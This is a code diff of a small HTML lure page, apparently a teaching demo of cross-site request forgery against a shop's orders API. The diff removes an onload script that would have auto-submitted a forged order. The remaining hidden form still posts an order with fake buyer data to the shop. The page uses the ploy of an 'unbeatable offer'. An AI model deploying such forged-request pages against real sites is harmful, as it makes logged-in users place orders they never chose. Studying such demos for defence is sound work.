@@ -3,34 +3,9 @@
     <head>
         <title>Shop</title>
         <meta charset="UTF-8" />
-        <script type="text/javascript">
-
-            function buy() {
-                /*
-                fetch("https://nf-shop.herokuapp.com/api/orders", {
-                    method: 'POST',
-                    credentials: "include",
-                    mode: "no-cors",
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Content-Type': 'text/plain'
-                    },
-                    body: JSON.stringify({
-                        product: '4713',
-                        name: 'Andre Schreck',
-                        street: 'Evil-Street 1',
-                        zip: '666',
-                        city: 'Eviltown',
-                    })
-                });
-                */
-                //window.setTimeout(() => document.getElementById("myForm").submit());
-            }
-
-        </script>
     </head>
 
-    <body onload="buy()">
+    <body>
         Ich habe ein unschlagbares Angebot für dich!!!
         <form id="myForm" method="post" action="https://nf-shop.herokuapp.com/api/orders">
             <input type="hidden" id="product" name="product" value="4713" />
